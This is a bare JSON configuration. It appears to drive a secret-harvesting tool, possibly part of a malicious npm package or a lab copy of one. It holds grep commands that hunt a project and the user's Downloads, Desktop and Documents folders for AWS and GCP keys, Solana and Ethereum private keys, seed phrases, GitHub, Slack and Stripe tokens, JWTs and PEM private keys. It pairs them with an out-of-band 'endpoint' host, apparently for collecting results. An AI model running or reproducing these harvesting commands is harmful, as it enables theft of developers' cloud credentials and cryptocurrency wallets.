{"commands":{"aws":"grep -rE 'AKIA[0-9A-Z]{16}|aws_secret_access_key|AWS_SECRET_ACCESS_KEY' --include='*.{env,json,yaml,yml,tf,py,js,ts,sh}' . 2>/dev/null | head -50","gcp":"grep -rE 'type:\\s*service_account|private_key_id|client_secret|GOOGLE_APPLICATION_CREDENTIALS|AIza[0-9A-Za-z_-]{35}' --include='*.{json,env,yaml,yml,tf}' . 2>/dev/null | head -50","solana":"grep -rE '[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{87,88}|mnemonic|seed.?phrase|PRIVATE_KEY|private_key|secret.?key|solana' --include='*.{json,env,txt,md,cfg}' . 2>/dev/null | grep -v 'node_modules|package-lock' | head -50","ethereum":"grep -rE '0x[a-fA-F0-9]{64,66}|mnemonic|seed.?phrase|PRIVATE_KEY|private_key' --include='*.{json,env,txt,md,cfg,py,js,ts}' . 2>/dev/null | grep -v 'node_modules|package-lock' | head -50","crypto":"grep -rE '(PRIVATE|PRIVATE_KEY|secret|mnemonic|seed|passphrase|wallet|private_key|BASE58)[^a-zA-Z]{1}[A-Za-z0-9+/=_:;,\\-]{20,200}' --include='*.{json,env,txt,md,cfg,py,js,ts,sh}' . 2>/dev/null | grep -v 'node_modules|package-lock|public/' | head -50","all":"grep -RIsE \\\n--exclude-dir=.git \\\n--exclude-dir=node_modules \\\n--exclude-dir=dist \\\n--exclude-dir=build \\\n--exclude-dir=coverage \\\n--exclude-dir=.next \\\n--exclude-dir=.cache \\\n--exclude-dir=vendor \\\n--exclude-dir=tmp \\\n--exclude-dir=.terraform \\\n--exclude-dir=.venv \\\n--exclude-dir=venv \\\n--exclude-dir=__pycache__ \\\n--exclude-dir=target \\\n--exclude-dir=bin \\\n--exclude-dir=obj \\\n--exclude-dir=logs \\\n--exclude-dir=log \\\n--exclude-dir=images \\\n--exclude-dir=img \\\n--exclude-dir=assets \\\n--exclude-dir=static \\\n--exclude-dir=public \\\n--exclude-dir=media \\\n--exclude-dir=uploads \\\n--exclude-dir=fonts \\\n--exclude-dir=icons \\\n--exclude-dir=.go \\\n--exclude-dir=go \\\n--exclude-dir=.cargo \\\n--exclude-dir=.rustup \\\n--exclude-dir=.gradle \\\n--exclude-dir=.m2 \\\n--exclude-dir=.npm \\\n--exclude-dir=.yarn \\\n--exclude-dir=.pnpm \\\n--exclude-dir=.local \\\n--exclude-dir=.Trash \\\n--exclude-dir=Library \\\n--binary-files=without-match \\\n'(gh[pousr]_[A-Za-z0-9]{20,255}|AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|AIza[0-9A-Za-z\\-_]{35}|xox[baprs]-[0-9A-Za-z\\-]{10,48}|sk_live_[0-9A-Za-z]{24}|rk_live_[0-9A-Za-z]{24}|-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----|0x[a-fA-F0-9]{40}|eyJ[A-Za-z0-9_\\-]{10,}\\.[A-Za-z0-9_\\-]{10,}\\.[A-Za-z0-9_\\-]{10,}|(api|secret|private|access)[_-]?key[\\\"'\"'\"'=: ]+[A-Za-z0-9_\\-\\/+=]{16,}|mnemonic|seed)' \\\n~/Downloads ~/Desktop ~/Documents 2>/dev/null"},"endpoint":"https://ahlbtggbruiaxmzacqwmyf6lz4pvn50g3.oast.fun","repo":"Lapsus-Network/npmpack-lab"}